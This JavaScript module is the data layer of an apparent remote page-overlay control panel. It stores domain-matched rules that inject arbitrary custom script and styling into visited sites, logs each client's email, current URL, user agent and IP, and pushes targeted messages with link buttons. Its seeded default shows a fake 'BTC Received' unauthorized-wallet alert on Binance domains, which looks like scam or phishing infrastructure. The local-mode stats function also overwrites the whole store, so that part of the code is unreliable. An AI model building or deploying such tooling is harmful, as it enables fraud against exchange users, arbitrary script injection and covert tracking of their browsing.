import fs from 'fs';
import path from 'path';
import { ObjectId } from 'mongodb';
import { getDatabase } from './mongodb';

function buildIdFilter(id) {
  if (!id) return { id: '' };
  const filters = [{ id: String(id) }];
  if (typeof id === 'string' && ObjectId.isValid(id) && id.length === 24) {
    try {
      filters.push({ _id: new ObjectId(id) });
    } catch (e) {}
  }
  return { $or: filters };
}

const IS_SERVERLESS = !!(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME);
const DATA_DIR = path.join(process.cwd(), 'data');
const DATA_FILE = path.join(DATA_DIR, 'store.json');

const INITIAL_DATA = {
  rules: [
    {
      id: 'rule-binance-default',
      name: 'Binance BTC Received Alert',
      domain: '*.binance.com',
      enabled: true,
      priority: 10,
      targetClientId: null,
      overlay: {
        height: '50',
        bg: '#0b0e11',
        text: '#eaecef',
        titleColor: '#f0b90b',
        title: 'BTC Received!',
        message: 'Status: <span style="color:#848e9c;">pending</span><br>Unauthorized wallet.',
        position: 'top',
        closable: true,
        customCss: `#custom-sticky-popup {
  animation: slideDown 0.35s ease-out;
  border-bottom: 2px solid #f0b90b !important;
}
@keyframes slideDown {
  from { transform: translateY(-100%); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}`,
        customJs: `// Custom dynamic script injected for Binance
console.log('[RemoteOverlay] Active on Binance domain:', window.location.hostname);`
      },
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    },
    {
      id: 'rule-global-fallback',
      name: 'Global Notice (All Domains)',
      domain: '*',
      enabled: false,
      priority: 1,
      targetClientId: null,
      overlay: {
        height: '25',
        bg: '#181a20',
        text: '#ffffff',
        titleColor: '#00c087',
        title: 'Universal Remote Alert',
        message: 'This alert was configured globally from the Next.js Admin Dashboard.',
        position: 'top',
        closable: true,
        customCss: '',
        customJs: `console.log('[RemoteOverlay] Global overlay injected on:', window.location.hostname);`
      },
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    }
  ],
  clients: [],
  messages: [],
  stats: {
    totalRequests: 0,
    lastSync: new Date().toISOString(),
  }
};

let hasSeededMongo = false;

function ensureLocalDb() {
  if (IS_SERVERLESS) return;
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    if (!fs.existsSync(DATA_FILE)) {
      fs.writeFileSync(DATA_FILE, JSON.stringify(INITIAL_DATA, null, 2), 'utf-8');
    }
  } catch (err) {}
}

function getLocalDb() {
  if (IS_SERVERLESS) return INITIAL_DATA;
  ensureLocalDb();
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf-8');
    return JSON.parse(raw);
  } catch (err) {
    return INITIAL_DATA;
  }
}

function saveLocalDb(data) {
  if (IS_SERVERLESS) return;
  try {
    ensureLocalDb();
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {}
}

// Seed initial rules into MongoDB if empty
async function seedMongoIfEmpty(db) {
  if (hasSeededMongo) return;
  try {
    const count = await db.collection('rules').countDocuments();
    if (count === 0) {
      await db.collection('rules').insertMany(INITIAL_DATA.rules);
      console.log(`[MongoDB] Initialized collection 'rules' with default seed documents.`);
    }
    hasSeededMongo = true;
  } catch (err) {
    console.warn('[MongoDB] Seed check error:', err.message);
  }
}

export function matchDomain(pattern, targetDomain) {
  if (!pattern || !targetDomain) return false;
  pattern = pattern.trim().toLowerCase();
  targetDomain = targetDomain.trim().toLowerCase();

  if (pattern === '*' || pattern === '<all_urls>') return true;
  if (pattern === targetDomain) return true;

  if (pattern.startsWith('*.')) {
    const root = pattern.slice(2);
    return targetDomain === root || targetDomain.endsWith('.' + root);
  }

  if (pattern.includes('*')) {
    const regexStr = '^' + pattern.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$';
    return new RegExp(regexStr).test(targetDomain);
  }

  return targetDomain.includes(pattern);
}

// ----------------------------------------------------------------------
// RULES OPERATIONS
// ----------------------------------------------------------------------

export async function getRules() {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    await seedMongoIfEmpty(db);
    const mongoRules = await db.collection('rules').find({}).toArray();
    return mongoRules.map(({ _id, ...rest }) => ({
      ...rest,
      id: rest.id || String(_id),
    }));
  }
  const local = getLocalDb();
  return local.rules || [];
}

export async function createRule(ruleData) {
  const { db, isLive } = await getDatabase();
  const newRule = {
    id: 'rule_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
    name: ruleData.name || `Overlay for ${ruleData.domain}`,
    domain: (ruleData.domain || '*').trim(),
    enabled: ruleData.enabled !== undefined ? ruleData.enabled : true,
    priority: Number(ruleData.priority) || 10,
    targetClientId: ruleData.targetClientId || null,
    overlay: {
      height: '50',
      bg: '#0b0e11',
      text: '#eaecef',
      titleColor: '#f0b90b',
      title: 'Notice',
      message: 'Important security notification.',
      position: 'top',
      closable: true,
      animation: 'slideDown',
      borderRadius: '0',
      borderWidth: '2',
      borderColor: '#f0b90b',
      shadow: 'strong',
      backdropBlur: false,
      titleSize: '40',
      messageSize: '20',
      textAlign: 'center',
      ctaText: '',
      ctaUrl: '',
      ctaBg: '#f0b90b',
      ctaColor: '#000000',
      targetSelector: 'body',
      targetAction: 'fixed',
      customCss: '',
      customJs: '',
      ...(ruleData.overlay || {}),
    },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };

  if (isLive) {
    await db.collection('rules').insertOne({ ...newRule });
    return newRule;
  }

  const local = getLocalDb();
  local.rules = local.rules || [];
  local.rules.unshift(newRule);
  saveLocalDb(local);

  return newRule;
}

export async function updateRule(id, updates) {
  const { db, isLive } = await getDatabase();
  const updatedAt = new Date().toISOString();

  let updatedRule = null;

  if (isLive) {
    const filter = buildIdFilter(id);
    const existing = await db.collection('rules').findOne(filter);
    if (existing) {
      const merged = {
        ...existing,
        ...updates,
        id: existing.id || String(existing._id),
        overlay: {
          ...(existing.overlay || {}),
          ...(updates.overlay || {}),
        },
        updatedAt,
      };
      delete merged._id;
      await db.collection('rules').updateOne(filter, { $set: merged });
      return merged;
    }
  }

  const local = getLocalDb();
  const index = (local.rules || []).findIndex((r) => r.id === id);
  if (index >= 0) {
    local.rules[index] = {
      ...local.rules[index],
      ...updates,
      overlay: {
        ...(local.rules[index].overlay || {}),
        ...(updates.overlay || {}),
      },
      updatedAt,
    };
    saveLocalDb(local);
    updatedRule = local.rules[index];
  }

  return updatedRule;
}

export async function deleteRule(id) {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    await db.collection('rules').deleteOne(buildIdFilter(id));
    return true;
  }

  const local = getLocalDb();
  local.rules = (local.rules || []).filter((r) => r.id !== id);
  saveLocalDb(local);
  return true;
}

export async function findMatchingRule(domain, clientId = null) {
  await recordRequestStats();

  if (!domain) return null;

  const { db, isLive } = await getDatabase();

  // 1. Check for targeted active message for this specific client
  if (clientId) {
    let targetedMsg = null;
    if (isLive) {
      targetedMsg = await db.collection('messages').findOne({
        isActive: true,
        targetClientId: clientId,
      });
    } else {
      const local = getLocalDb();
      targetedMsg = (local.messages || []).find(
        (m) => m.isActive && m.targetClientId === clientId
      );
    }

    if (targetedMsg) {
      return {
        id: targetedMsg.id,
        name: `Targeted Message for ${clientId}`,
        domain: domain,
        enabled: true,
        priority: 999,
        targetClientId: clientId,
        overlay: {
          height: targetedMsg.height || '45',
          width: targetedMsg.width || '520px',
          bg: targetedMsg.colorBg || '#14171d',
          text: targetedMsg.colorText || '#eaecef',
          titleColor: targetedMsg.colorTitle || '#f0b90b',
          borderColor: targetedMsg.borderColor || targetedMsg.colorTitle || '#f0b90b',
          borderWidth: '2',
          borderRadius: '16',
          shadow: 'strong',
          backdropBlur: true,
          title: targetedMsg.title,
          message: targetedMsg.body,
          ctaText: targetedMsg.ctaText || '',
          ctaUrl: targetedMsg.ctaUrl || '',
          ctaBg: targetedMsg.ctaBg || targetedMsg.colorTitle || '#f0b90b',
          ctaColor: targetedMsg.ctaColor || '#000000',
          position: targetedMsg.position || 'center',
          closable: true,
          customCss: targetedMsg.customCss || '',
          customJs: targetedMsg.customJs || '',
        },
        isTargetedMessage: true,
        updatedAt: targetedMsg.createdAt,
      };
    }
  }

  // 2. Fetch enabled rules
  let activeRules = [];
  if (isLive) {
    await seedMongoIfEmpty(db);
    activeRules = await db.collection('rules').find({ enabled: true }).toArray();
  } else {
    const local = getLocalDb();
    activeRules = (local.rules || []).filter((r) => r.enabled);
  }

  // Client specific rule
  if (clientId) {
    const clientSpecificRule = activeRules.find(
      (r) => r.targetClientId === clientId && matchDomain(r.domain, domain)
    );
    if (clientSpecificRule) return clientSpecificRule;
  }

  // Domain specific rule
  const domainSpecificRules = activeRules
    .filter((r) => r.domain !== '*' && matchDomain(r.domain, domain))
    .sort((a, b) => (b.priority || 0) - (a.priority || 0));

  if (domainSpecificRules.length > 0) {
    return domainSpecificRules[0];
  }

  // Global wildcard
  const globalRule = activeRules.find((r) => r.domain === '*');
  if (globalRule) {
    return globalRule;
  }

  return null;
}

// ----------------------------------------------------------------------
// CLIENTS OPERATIONS
// ----------------------------------------------------------------------

export async function registerClientHeartbeat({ clientId, email, domain, currentUrl, userAgent, ip }) {
  const { db, isLive } = await getDatabase();
  const now = new Date().toISOString();

  const clientInfo = {
    clientId,
    email: email || 'Anonymous Client',
    lastDomain: domain || 'unknown',
    lastUrl: currentUrl || '',
    lastSeen: now,
    userAgent: userAgent || '',
    ip: ip || '127.0.0.1',
    status: 'online',
  };

  if (isLive) {
    await db.collection('clients').updateOne(
      { clientId },
      { $set: clientInfo },
      { upsert: true }
    );
    return clientInfo;
  }

  const local = getLocalDb();
  local.clients = local.clients || [];
  const idx = local.clients.findIndex((c) => c.clientId === clientId);
  if (idx >= 0) {
    local.clients[idx] = { ...local.clients[idx], ...clientInfo };
  } else {
    local.clients.unshift(clientInfo);
  }
  if (local.clients.length > 200) local.clients = local.clients.slice(0, 200);
  saveLocalDb(local);

  return clientInfo;
}

export async function getClients() {
  const { db, isLive } = await getDatabase();
  const now = Date.now();

  let rawClients = [];
  if (isLive) {
    rawClients = await db.collection('clients').find({}).sort({ lastSeen: -1 }).toArray();
  } else {
    const local = getLocalDb();
    rawClients = local.clients || [];
  }

  return rawClients.map((c) => {
    const lastSeenTime = new Date(c.lastSeen).getTime();
    const isOnline = now - lastSeenTime < 2 * 60 * 1000;
    return {
      clientId: c.clientId,
      email: c.email,
      lastDomain: c.lastDomain,
      lastUrl: c.lastUrl,
      lastSeen: c.lastSeen,
      status: isOnline ? 'online' : 'offline',
      secondsAgo: Math.round((now - lastSeenTime) / 1000),
    };
  });
}

// ----------------------------------------------------------------------
// MESSAGES OPERATIONS
// ----------------------------------------------------------------------

export async function getMessages() {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    return db.collection('messages').find({}).sort({ createdAt: -1 }).toArray();
  }
  const local = getLocalDb();
  return local.messages || [];
}

export async function createMessage(msgData) {
  const { db, isLive } = await getDatabase();
  const newMsg = {
    id: 'msg_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    targetClientId: msgData.targetClientId || null,
    title: msgData.title,
    body: msgData.body,
    colorBg: msgData.colorBg || '#14171d',
    colorText: msgData.colorText || '#eaecef',
    colorTitle: msgData.colorTitle || '#f0b90b',
    borderColor: msgData.borderColor || msgData.colorTitle || '#f0b90b',
    ctaText: msgData.ctaText || '',
    ctaUrl: msgData.ctaUrl || '',
    ctaBg: msgData.ctaBg || msgData.colorTitle || '#f0b90b',
    ctaColor: msgData.ctaColor || '#000000',
    position: msgData.position || 'center',
    height: msgData.height || '45',
    width: msgData.width || '520px',
    customCss: msgData.customCss || '',
    customJs: msgData.customJs || '',
    isActive: true,
    createdAt: new Date().toISOString(),
  };

  if (isLive) {
    await db.collection('messages').insertOne({ ...newMsg });
    return newMsg;
  }

  const local = getLocalDb();
  local.messages = local.messages || [];
  local.messages.unshift(newMsg);
  saveLocalDb(local);

  return newMsg;
}

export async function deleteMessage(id) {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    await db.collection('messages').deleteOne({ id });
    return true;
  }
  const local = getLocalDb();
  local.messages = (local.messages || []).filter((m) => m.id !== id);
  saveLocalDb(local);
  return true;
}

// ----------------------------------------------------------------------
// STATS OPERATIONS
// ----------------------------------------------------------------------

async function recordRequestStats() {
  const now = new Date().toISOString();
  try {
    const { db, isLive } = await getDatabase();
    if (isLive) {
      await db.collection('stats').updateOne(
        { _id: 'global_stats' },
        { $inc: { totalRequests: 1 }, $set: { lastSync: now } },
        { upsert: true }
      );
      return;
    }
  } catch (e) {}

  saveLocalDb({ stats: { totalRequests: 1, lastSync: now } });
}

export async function getStats() {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    const doc = await db.collection('stats').findOne({ _id: 'global_stats' });
    const rulesCount = await db.collection('rules').countDocuments();
    const clientsCount = await db.collection('clients').countDocuments();
    return {
      totalRequests: doc?.totalRequests || 0,
      rulesCount,
      totalClients: clientsCount,
      isMongoLive: true,
    };
  }
  const local = getLocalDb();
  return {
    totalRequests: local.stats?.totalRequests || 0,
    rulesCount: (local.rules || []).length,
    totalClients: (local.clients || []).length,
    isMongoLive: false,
  };
}
